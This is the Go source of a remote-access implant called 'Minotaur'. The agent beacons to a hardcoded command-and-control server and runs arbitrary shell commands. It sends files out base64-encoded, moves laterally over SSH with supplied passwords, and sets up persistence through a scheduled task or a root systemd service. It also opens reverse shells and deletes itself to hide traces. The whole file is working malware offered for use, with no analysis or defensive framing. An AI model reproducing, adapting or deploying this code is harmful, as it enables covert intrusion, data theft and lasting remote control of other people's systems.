package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

type Config struct {
	ServerURL   string
	BeaconDelay time.Duration
	Jitter      time.Duration
	UserAgent   string
	InsecureTLS bool
}

var config = Config{
	ServerURL:   "http://192.168.2.133:5000", // CHANGE THIS
	BeaconDelay: 30 * time.Second,
	Jitter:      2 * time.Second,
	UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	InsecureTLS: true,
}

var agentID string
var client *http.Client

type AgentInfo struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	Arch     string `json:"arch"`
}

type Command struct {
	ID      string            `json:"id"`
	Type    string            `json:"type"` // exec, exfil, lateral, persistence, delete, shell
	Payload map[string]string `json:"payload"`
}

type CommandResult struct {
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	Error     string `json:"error"`
}

type ExfilData struct {
	AgentID    string `json:"agent_id"`
	FilePath   string `json:"file_path"`
	FileBase64 string `json:"file_base64"`
}

func init() {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
	}
	client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
}

func logf(format string, args ...interface{}) {
	fmt.Printf("[MINOTAUR] "+format+"\n", args...)
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func register() {
	info := AgentInfo{
		Hostname: getHostname(),
		OS:       runtime.GOOS,
		IP:       getOutboundIP(),
		Arch:     runtime.GOARCH,
	}
	jsonData, _ := json.Marshal(info)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/register", bytes.NewBuffer(jsonData))
	if err != nil {
		logf("Register request creation error: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		logf("Register error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		var result map[string]string
		json.NewDecoder(resp.Body).Decode(&result)
		agentID = result["agent_id"]
		logf("Registered successfully with ID: %s", agentID)
	} else {
		logf("Registration failed, HTTP status: %d", resp.StatusCode)
	}
}

func beacon() ([]Command, error) {
	info := AgentInfo{ID: agentID}
	jsonData, _ := json.Marshal(info)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/beacon", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("beacon failed, status: %d", resp.StatusCode)
	}

	var commands []Command
	err = json.NewDecoder(resp.Body).Decode(&commands)
	return commands, err
}

func executeCommand(cmdStr string) (string, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}
	stdout, err := cmd.Output()
	if err != nil {
		return "", err.Error()
	}
	return string(stdout), ""
}

func sendResult(result CommandResult) error {
	jsonData, _ := json.Marshal(result)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/result", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func exfiltrateFile(filePath string) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	payload := ExfilData{
		AgentID:    agentID,
		FilePath:   filePath,
		FileBase64: encoded,
	}
	jsonData, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/exfil", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func lateralMovement(target, user, password, command string) (string, error) {
	if runtime.GOOS == "windows" {
		cmdStr := fmt.Sprintf(`plink -ssh -l %s -pw %s %s "%s"`, user, password, target, command)
		out, errMsg := executeCommand(cmdStr)
		if errMsg != "" {
			return "", fmt.Errorf(errMsg)
		}
		return out, nil
	} else {
		cmdStr := fmt.Sprintf(`sshpass -p '%s' ssh -o StrictHostKeyChecking=no %s@%s '%s'`, password, user, target, command)
		out, errMsg := executeCommand(cmdStr)
		if errMsg != "" {
			return "", fmt.Errorf(errMsg)
		}
		return out, nil
	}
}

func setupPersistence() (string, error) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("schtasks", "/create", "/tn", "MinotaurAgent", "/tr", os.Args[0], "/sc", "minute", "/mo", "5", "/f")
		err := cmd.Run()
		if err != nil {
			return "", err
		}
		return "schtasks", nil
	} else if runtime.GOOS == "linux" {
		serviceContent := `[Unit]
Description=Minotaur Agent
After=network.target

[Service]
ExecStart=` + os.Args[0] + `
Restart=always
User=root

[Install]
WantedBy=multi-user.target`
		err := os.WriteFile("/etc/systemd/system/minotaur-agent.service", []byte(serviceContent), 0644)
		if err != nil {
			return "", err
		}
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", "minotaur-agent.service").Run()
		exec.Command("systemctl", "start", "minotaur-agent.service").Run()
		return "systemd", nil
	}
	return "", fmt.Errorf("unsupported OS for persistence")
}

func selfDestruct() {
	logf("Self‑destruct initiated")
	if runtime.GOOS == "windows" {
		exec.Command("schtasks", "/delete", "/tn", "MinotaurAgent", "/f").Run()
	} else if runtime.GOOS == "linux" {
		exec.Command("systemctl", "stop", "minotaur-agent.service").Run()
		exec.Command("systemctl", "disable", "minotaur-agent.service").Run()
		os.Remove("/etc/systemd/system/minotaur-agent.service")
		exec.Command("systemctl", "daemon-reload").Run()
	}
	exePath, err := os.Executable()
	if err != nil {
		exePath = os.Args[0]
	}
	if runtime.GOOS == "windows" {
		batchContent := fmt.Sprintf(`@echo off
timeout /t 2 /nobreak > nul
del /f /q "%s"
del /f /q "%%~f0"
`, exePath)
		batchPath := filepath.Join(os.TempDir(), "minotaur_cleanup.bat")
		os.WriteFile(batchPath, []byte(batchContent), 0700)
		cmd := exec.Command("cmd", "/c", batchPath)
		cmd.Start()
	} else {
		scriptContent := fmt.Sprintf(`#!/bin/sh
sleep 2
rm -f "%s"
rm -f "$0"
`, exePath)
		scriptPath := filepath.Join(os.TempDir(), "minotaur_cleanup.sh")
		os.WriteFile(scriptPath, []byte(scriptContent), 0700)
		cmd := exec.Command("/bin/sh", scriptPath)
		cmd.Start()
	}
	os.Exit(0)
}

func spawnReverseShell(ip, port string) {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		logf("Reverse shell connection failed: %v", err)
		return
	}
	defer conn.Close()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func processCommand(cmd Command) {
	switch cmd.Type {
	case "exec":
		cmdStr := cmd.Payload["command"]
		logf("Executing command: %s", cmdStr)
		output, errMsg := executeCommand(cmdStr)
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: errMsg})
	case "exfil":
		filePath := cmd.Payload["path"]
		err := exfiltrateFile(filePath)
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: "Exfiltrated " + filePath})
		}
	case "lateral":
		target := cmd.Payload["target"]
		user := cmd.Payload["user"]
		password := cmd.Payload["password"]
		command := cmd.Payload["command"]
		out, err := lateralMovement(target, user, password, command)
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: out})
		}
	case "persistence":
		method, err := setupPersistence()
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: "Persistence installed using " + method})
		}
	case "shell":
		ip := cmd.Payload["ip"]
		port := cmd.Payload["port"]
		go spawnReverseShell(ip, port)
		sendResult(CommandResult{CommandID: cmd.ID, Output: "Reverse shell spawning", Error: ""})
	case "delete":
		go selfDestruct()
		return
	default:
		logf("Unknown command type: %s", cmd.Type)
	}
}

func main() {
	logf("Starting Minotaur agent on %s/%s", runtime.GOOS, runtime.GOARCH)
	register()
	if agentID == "" {
		logf("Registration failed, exiting after 10 seconds")
		time.Sleep(10 * time.Second)
		return
	}

	for {
		jitter := time.Duration(0)
		if config.Jitter > 0 {
			jitter = time.Duration(time.Now().UnixNano()%int64(config.Jitter))
		}
		time.Sleep(config.BeaconDelay + jitter)

		commands, err := beacon()
		if err != nil {
			logf("Beacon error: %v", err)
			continue
		}
		if len(commands) > 0 {
			logf("Received %d command(s)", len(commands))
		}
		for _, cmd := range commands {
			go processCommand(cmd)
		}
	}
}